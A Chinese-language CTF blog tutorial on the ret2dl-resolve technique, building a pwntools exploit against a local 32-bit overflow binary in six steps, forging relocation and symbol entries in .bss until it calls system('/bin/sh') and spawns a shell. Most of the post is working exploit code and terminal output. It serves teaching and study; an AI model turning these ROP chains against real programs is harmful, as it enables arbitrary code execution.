<h1 id="Pwned-One-by-One"><a href="#Pwned-One-by-One" class="headerlink" title="Pwned One by One"></a>Pwned One by One</h1><ol>
<li>控制 <code>eip</code> 为 <code>PLT[0]</code> 的地址，只需传递一个 <code>index_arg</code> 参数</li>
<li>控制 <code>index_arg</code> 的大小，使 <code>reloc</code> 的位置落在可控地址（比如 <code>.bss</code> 段）内</li>
<li>伪造 <code>reloc</code> 的内容，使 <code>sym</code> 落在可控地址（比如 <code>.bss</code> 段）内</li>
<li>伪造 <code>sym</code> 的内容，使 <code>name</code> 落在可控地址（比如 <code>.bss</code> 段）内</li>
<li>伪造 <code>name</code> 为任意库函数，比如说 <code>system</code></li>
</ol>
<p>接下来一步一步地实现对 <code>dl-resolve</code> 的利用</p>
<h2 id="Step-one"><a href="#Step-one" class="headerlink" title="Step one"></a>Step one</h2><p>先实现一个 ROP 直接返回 <code>write@plt</code>，然后输出我们设定的参数</p>
<pre><code class="python">#!/usr/bin/env python
from pwn import *
# context.log_level = &#39;debug&#39;
context.arch = &#39;i386&#39;
p = process(&#39;./bof&#39;)
elf = ELF(&#39;./bof&#39;)
g = lambda x: next(elf.search(asm(x)))
write_plt = elf.plt[&#39;write&#39;]
read_plt = elf.plt[&#39;read&#39;]
pop_ebp_ret = g(&#39;pop ebp ; ret&#39;)
leave_ret = g(&#39;leave ; ret&#39;)
bss = 0x0804a040 # readelf -S ./bof | grep &quot;.bss&quot;
buf = bss + 0x800
pop_pop_pop_ret = 0x08048629 # ROPgadget --binary ./bof --only &quot;pop|ret&quot;

# raw_input(&#39;@&#39;)
offset = 112
p.recvuntil(&#39;Return to dl_runtime_resolve!&#39;)
payload = flat([
    &#39;A&#39; * offset,
    read_plt,
    pop_pop_pop_ret,
    0, buf, 100,
    pop_ebp_ret,
    buf - 4,
    leave_ret
])
p.sendline(payload)

# raw_input(&#39;@&#39;)
cmd = &#39;/bin/sh&#39;
payload = flat([
    write_plt,
    0xdeadbeef,
    1, buf + 80, len(cmd)
])
payload = payload.ljust(80, &#39;A&#39;)
payload += cmd + &#39;\x00&#39;
payload = payload.ljust(100, &#39;A&#39;)
p.sendline(payload)
p.interactive()
</code></pre>
<p>最后会输出 <code>buf + 80</code> 上的字符串 <code>/bin/sh</code>：</p>
<pre><code class="bash">λ ./exp.py
[+] Starting local process &#39;./bof&#39;: pid 7067
[*] &#39;/home/assassinq/Desktop/ret2dl-resolve/bof&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode

/bin/sh[*] Got EOF while reading in interactive
$
</code></pre>
<h2 id="Step-Two"><a href="#Step-Two" class="headerlink" title="Step Two"></a>Step Two</h2><p>第二次直接返回 <code>PLT[0]</code>，要带上 <code>write</code> 的 <code>index_offset</code>。</p>
<pre><code class="python">#!/usr/bin/env python
from pwn import *
# context.log_level = &#39;debug&#39;
context.arch = &#39;i386&#39;
p = process(&#39;./bof&#39;)
elf = ELF(&#39;./bof&#39;)
g = lambda x: next(elf.search(asm(x)))
write_plt = elf.plt[&#39;write&#39;]
read_plt = elf.plt[&#39;read&#39;]
pop_ebp_ret = g(&#39;pop ebp ; ret&#39;)
leave_ret = g(&#39;leave ; ret&#39;)
bss = 0x0804a040 # readelf -S ./bof | grep &quot;.bss&quot;
buf = bss + 0x800
pop_pop_pop_ret = 0x08048629 # ROPgadget --binary ./bof --only &quot;pop|ret&quot;

# raw_input(&#39;@&#39;)
offset = 112
p.recvuntil(&#39;Return to dl_runtime_resolve!&#39;)
payload = flat([
    &#39;A&#39; * offset,
    read_plt,
    pop_pop_pop_ret,
    0, buf, 100,
    pop_ebp_ret,
    buf - 4,
    leave_ret
])
p.sendline(payload)

# raw_input(&#39;@&#39;)
cmd = &#39;/bin/sh&#39;
plt_0 = 0x08048380 # objdump -d -j .plt ./bof
index_offset = 0x20
payload = flat([
    plt_0,
    index_offset,
    0xdeadbeef,
    1, buf + 80, len(cmd)
])
payload = payload.ljust(80, &#39;A&#39;)
payload += cmd + &#39;\x00&#39;
payload = payload.ljust(100, &#39;A&#39;)
p.sendline(payload)
p.interactive()
</code></pre>
<p>最后同样也是输出 <code>/bin/sh</code>：</p>
<pre><code class="bash">λ ./exp.py
[+] Starting local process &#39;./bof&#39;: pid 7270
[*] &#39;/home/assassinq/Desktop/ret2dl-resolve/bof&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode

/bin/sh[*] Got EOF while reading in interactive
$
</code></pre>
<h2 id="Step-Three"><a href="#Step-Three" class="headerlink" title="Step Three"></a>Step Three</h2><p>接下来我们在 <code>.bss</code> 上构造假的 <code>reloc</code>，并让 <code>dl-runtime.c</code> 来解析：</p>
<pre><code class="python">#!/usr/bin/env python
from pwn import *
# context.log_level = &#39;debug&#39;
context.arch = &#39;i386&#39;
p = process(&#39;./bof&#39;)
elf = ELF(&#39;./bof&#39;)
g = lambda x: next(elf.search(asm(x)))
write_plt = elf.plt[&#39;write&#39;]
write_got = elf.got[&#39;write&#39;]
read_plt = elf.plt[&#39;read&#39;]
pop_ebp_ret = g(&#39;pop ebp ; ret&#39;)
leave_ret = g(&#39;leave ; ret&#39;)
bss = 0x0804a040 # readelf -S ./bof | grep &quot;.bss&quot;
buf = bss + 0x800
pop_pop_pop_ret = 0x08048629 # ROPgadget --binary ./bof --only &quot;pop|ret&quot;

# raw_input(&#39;@&#39;)
offset = 112
p.recvuntil(&#39;Return to dl_runtime_resolve!&#39;)
payload = flat([
    &#39;A&#39; * offset,
    read_plt,
    pop_pop_pop_ret,
    0, buf, 100,
    pop_ebp_ret,
    buf - 4,
    leave_ret
])
p.sendline(payload)

# raw_input(&#39;@&#39;)
cmd = &#39;/bin/sh&#39;
plt_0 = 0x08048380 # objdump -d -j .plt ./bof
rel_plt = 0x8048330 # objdump -s -j .rel.plt ./bof
index_offset = (buf + 24)- rel_plt
r_info = 0x607
fake_reloc = p32(write_got) + p32(r_info)
payload = flat([
    plt_0,
    index_offset,
    0xdeadbeef,
    1, buf + 80, len(cmd),
    fake_reloc
])
payload = payload.ljust(80, &#39;A&#39;)
payload += cmd + &#39;\x00&#39;
payload = payload.ljust(100, &#39;A&#39;)
p.sendline(payload)
p.interactive()
</code></pre>
<p>最后得到相同的结果：</p>
<pre><code class="bash">λ ./exp.py
[+] Starting local process &#39;./bof&#39;: pid 8237
[*] &#39;/home/assassinq/Desktop/ret2dl-resolve/bof&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode

/bin/sh[*] Got EOF while reading in interactive
$
</code></pre>
<h2 id="Step-Four"><a href="#Step-Four" class="headerlink" title="Step Four"></a>Step Four</h2><p>这一次构造假的 <code>.sym</code>，使其指向我们控制的 <code>st_name</code></p>
<pre><code class="python">#!/usr/bin/env python
from pwn import *
context.arch = &#39;i386&#39;
p = process(&#39;./bof&#39;)
elf = ELF(&#39;./bof&#39;)
g = lambda x: next(elf.search(asm(x)))
write_plt = elf.plt[&#39;write&#39;]
write_got = elf.got[&#39;write&#39;]
read_plt = elf.plt[&#39;read&#39;]
pop_ebp_ret = g(&#39;pop ebp ; ret&#39;)
leave_ret = g(&#39;leave ; ret&#39;)
bss = 0x0804a040 # readelf -S ./bof | grep &quot;.bss&quot;
buf = bss + 0x800
pop_pop_pop_ret = 0x08048629 # ROPgadget --binary ./bof --only &quot;pop|ret&quot;

# raw_input(&#39;@&#39;)
offset = 112
p.recvuntil(&#39;Return to dl_runtime_resolve!&#39;)
payload = flat([
    &#39;A&#39; * offset,
    read_plt,
    pop_pop_pop_ret,
    0, buf, 100,
    pop_ebp_ret,
    buf - 4,
    leave_ret
])
p.sendline(payload)

# raw_input(&#39;@&#39;)
cmd = &#39;/bin/sh&#39;
plt_0 = 0x08048380 # objdump -d -j .plt ./bof
rel_plt = 0x8048330 # objdump -s -j .rel.plt ./bof
index_offset = (buf + 24)- rel_plt
dynsym = 0x080481d8 # readelf -S ./bof | grep &quot;.dynsym&quot;
dynstr = 0x08048278 # readelf -S ./bof | grep &quot;.dynstr&quot;
fake_sym_addr = buf + 32
align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)
fake_sym_addr += align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (index_dynsym &lt;&lt; 8) | 0x7
fake_reloc = p32(write_got) + p32(r_info)
st_name = 0x4c
fake_sym = flat([
    st_name, 0, 0, 0x12
])
payload = flat([
    plt_0,
    index_offset,
    0xdeadbeef,
    1, buf + 80, len(cmd),
    fake_reloc,
    &#39;A&#39; * align,
    fake_sym
])
payload = payload.ljust(80, &#39;A&#39;)
payload += cmd + &#39;\x00&#39;
payload = payload.ljust(100, &#39;A&#39;)
p.sendline(payload)
p.interactive()
</code></pre>
<p>因为 <code>dynsym</code> 里的 <code>Elf32_Sym</code> 结构体都是 <code>0x10</code> 字节大小，所以这里需要对齐操作；因为 <code>Elf32_Sym</code> 结构体的大小为 <code>0x10</code>，所以要除以 <code>0x10</code> 才能得到 <code>write</code> 的 <code>dynsym</code> 索引号。最后成功运行：</p>
<pre><code class="bash">λ ./exp.py
[+] Starting local process &#39;./bof&#39;: pid 9736
[*] &#39;/home/assassinq/Desktop/ret2dl-resolve/bof&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode

/bin/sh[*] Got EOF while reading in interactive
$
</code></pre>
<h2 id="Step-Five"><a href="#Step-Five" class="headerlink" title="Step Five"></a>Step Five</h2><p>接下来一步把 <code>st_name</code> 指向输入的字符串 <code>&quot;write&quot;</code>：</p>
<pre><code class="python">#!/usr/bin/env python
from pwn import *
context.arch = &#39;i386&#39;
p = process(&#39;./bof&#39;)
elf = ELF(&#39;./bof&#39;)
g = lambda x: next(elf.search(asm(x)))
write_plt = elf.plt[&#39;write&#39;]
write_got = elf.got[&#39;write&#39;]
read_plt = elf.plt[&#39;read&#39;]
pop_ebp_ret = g(&#39;pop ebp ; ret&#39;)
leave_ret = g(&#39;leave ; ret&#39;)
bss = 0x0804a040 # readelf -S ./bof | grep &quot;.bss&quot;
buf = bss + 0x800
pop_pop_pop_ret = 0x08048629 # ROPgadget --binary ./bof --only &quot;pop|ret&quot;

# raw_input(&#39;@&#39;)
offset = 112
p.recvuntil(&#39;Return to dl_runtime_resolve!&#39;)
payload = flat([
    &#39;A&#39; * offset,
    read_plt,
    pop_pop_pop_ret,
    0, buf, 100,
    pop_ebp_ret,
    buf - 4,
    leave_ret
])
p.sendline(payload)

# raw_input(&#39;@&#39;)
cmd = &#39;/bin/sh&#39;
plt_0 = 0x08048380 # objdump -d -j .plt ./bof
rel_plt = 0x8048330 # objdump -s -j .rel.plt ./bof
index_offset = (buf + 24)- rel_plt
dynsym = 0x080481d8 # readelf -S ./bof | grep &quot;.dynsym&quot;
dynstr = 0x08048278 # readelf -S ./bof | grep &quot;.dynstr&quot;
fake_sym_addr = buf + 32
align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)
fake_sym_addr += align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (index_dynsym &lt;&lt; 8) | 0x7
fake_reloc = p32(write_got) + p32(r_info)
st_name = (fake_sym_addr + 0x10) - dynstr
fake_sym = flat([
    st_name, 0, 0, 0x12
])
payload = flat([
    plt_0,
    index_offset,
    0xdeadbeef,
    1, buf + 80, len(cmd),
    fake_reloc,
    &#39;A&#39; * align,
    fake_sym,
    &#39;write\x00&#39;
])
payload = payload.ljust(80, &#39;A&#39;)
payload += cmd + &#39;\x00&#39;
payload = payload.ljust(100, &#39;A&#39;)
p.sendline(payload)
p.interactive()
</code></pre>
<p>中间 <code>stname</code> 的位置因为 <code>Elf32_Sym</code> 的大小为 <code>0x10</code>，所以要加 <code>0x10</code>。结果成功：</p>
<pre><code class="bash">λ ./exp.py
[+] Starting local process &#39;./bof&#39;: pid 9778
[*] &#39;/home/assassinq/Desktop/ret2dl-resolve/bof&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode

/bin/sh[*] Got EOF while reading in interactive
$
</code></pre>
<h2 id="Step-Six"><a href="#Step-Six" class="headerlink" title="Step Six"></a>Step Six</h2><p>最后一步将 <code>write</code> 改成 <code>system</code>，同时设置一下 <code>system</code> 的参数：</p>
<pre><code class="python">#!/usr/bin/env python
from pwn import *
context.arch = &#39;i386&#39;
p = process(&#39;./bof&#39;)
elf = ELF(&#39;./bof&#39;)
g = lambda x: next(elf.search(asm(x)))
write_plt = elf.plt[&#39;write&#39;]
write_got = elf.got[&#39;write&#39;]
read_plt = elf.plt[&#39;read&#39;]
pop_ebp_ret = g(&#39;pop ebp ; ret&#39;)
leave_ret = g(&#39;leave ; ret&#39;)
bss = 0x0804a040 # readelf -S ./bof | grep &quot;.bss&quot;
buf = bss + 0x800
pop_pop_pop_ret = 0x08048629 # ROPgadget --binary ./bof --only &quot;pop|ret&quot;

# raw_input(&#39;@&#39;)
offset = 112
p.recvuntil(&#39;Return to dl_runtime_resolve!&#39;)
payload = flat([
    &#39;A&#39; * offset,
    read_plt,
    pop_pop_pop_ret,
    0, buf, 100,
    pop_ebp_ret,
    buf - 4,
    leave_ret
])
p.sendline(payload)

# raw_input(&#39;@&#39;)
cmd = &#39;/bin/sh&#39;
plt_0 = 0x08048380 # objdump -d -j .plt ./bof
rel_plt = 0x8048330 # objdump -s -j .rel.plt ./bof
index_offset = (buf + 24)- rel_plt
dynsym = 0x080481d8 # readelf -S ./bof | grep &quot;.dynsym&quot;
dynstr = 0x08048278 # readelf -S ./bof | grep &quot;.dynstr&quot;
fake_sym_addr = buf + 32
align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)
fake_sym_addr += align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (index_dynsym &lt;&lt; 8) | 0x7
fake_reloc = p32(write_got) + p32(r_info)
st_name = (fake_sym_addr + 0x10) - dynstr
fake_sym = flat([
    st_name, 0, 0, 0x12
])
payload = flat([
    plt_0,
    index_offset,
    0xdeadbeef,
    buf + 80,
    0xdeadbeef,
    0xdeadbeef,
    fake_reloc,
    &#39;A&#39; * align,
    fake_sym,
    &#39;system\x00&#39;
])
payload = payload.ljust(80, &#39;A&#39;)
payload += cmd + &#39;\x00&#39;
payload = payload.ljust(100, &#39;A&#39;)
p.sendline(payload)
p.interactive()
</code></pre>
<p>成功 Get Shell：</p>
<pre><code class="bash">λ ./exp.py
[+] Starting local process &#39;./bof&#39;: pid 9948
[*] &#39;/home/assassinq/Desktop/ret2dl-resolve/bof&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode

$ ls
bof  bof.c  core  exp.py  Makefile  peda-session-bof.txt
$ id
uid=1000(assassinq) gid=1000(assassinq) groups=1000(assassinq),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(docker)
</code></pre>
<h1 id="Complement-64-bit"><a href="#Complement-64-bit" class="headerlink" title="Complement: 64 bit"></a>Complement: 64 bit</h1><p>64 位下的利用相较于 32 位下有一些不同，像是一些结构体发生变化，如 <code>Elf64_Rela</code>，还有其他的都在<a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">记事本的这篇文章</a>中都详细地介绍了。</p>
<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a><br><a href="http://www.inforsec.org/wp/?p=389" target="_blank" rel="noopener">http://www.inforsec.org/wp/?p=389</a><br><a href="http://drops.wooyun.org/binary/14360" target="_blank" rel="noopener">http://drops.wooyun.org/binary/14360</a><br><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a><br><a href="http://phrack.org/issues/58/4.html#article" target="_blank" rel="noopener">http://phrack.org/issues/58/4.html#article</a></p>

            </div>
            <hr>
            <div>
              <p>
                
                
                  <span>
                <i class="iconfont icon-tag"></i>
                    
                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                    
                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
                    
                  </span>
                
              </p>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-12 col-md-6">
                    
                      <a href="/2019/08/08/使用QEMU-gdb对Linux-Kernel进行调试/">
                        <i class="fa fa-chevron-left"></i>
                        <span>使用QEMU+gdb对Linux Kernel进行调试</span>
                      </a>
                    
                  </div>
                  <div class="post-next col-12 col-md-6">
                    
                      <a href="/2019/08/04/渗透测试基础指南/">
                        <span>渗透测试基础指南</span>
                        <i class="fa fa-chevron-right"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

              
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc-start"></div>
<div id="toc">
  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="http://blog.b3ale.cn" target="_blank" rel="nofollow noopener"><b>Hard Work Pays Off.</b></a>
    </div>
    
  <div>
    
      <!-- 不蒜子统计PV -->
      
      <span id="busuanzi_container_site_pv" style="display: none">
      总访问量 <span id="busuanzi_value_site_pv"></span> 次
    </span>
    
    
      <!-- 不蒜子统计UV -->
      
      <span id="busuanzi_container_site_uv" style="display: none">
      总访客数 <span id="busuanzi_value_site_uv"></span> 人
    </span>
    
  </div>


    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
<script src="/js/main.js"></script>


  <script src="/js/lazyload.js"></script>



  
  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var navHeight = $('#navbar').height();
      var toc = $('#toc');
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;
      var tocLimMax = 2 * boardTop + boardCtn.height();

      $(window).scroll(function () {
        var tocLimMin = $('#toc-start').offset().top - navHeight;
        var scroH = document.body.scrollTop + document.documentElement.scrollTop;

        if (tocLimMin <= scroH && scroH <= tocLimMax) {
          toc.css({
            'display': 'block',
            'position': 'fixed',
            'top': navHeight,
          });
        } else if (scroH <= tocLimMin) {
          toc.css({
            'position': '',
            'top': '',
          });
        } else if (scroH > tocLimMax) {
          toc.css('display', 'none');
        }
      });
      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc > p').css('visibility', 'visible');
      }
      var offset = boardCtn.css('margin-right')
      $('#toc-ctn').css({
        'right': offset
      })
    });
  </script>







  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




<!-- Plugins -->



  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "A trip of ret2dl-resolve&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>



  

  
    <!-- MathJax -->
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
          tex2jax: {
              inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
              processEscapes: true,
              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
          }
      });

      MathJax.Hub.Queue(function() {
          var all = MathJax.Hub.getAllJax(), i;
          for(i=0; i < all.length; i += 1) {
              all[i].SourceElement().parentNode.className += ' has-jax';
          }
      });

    </script>

    <script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->

  










</body>
</html>
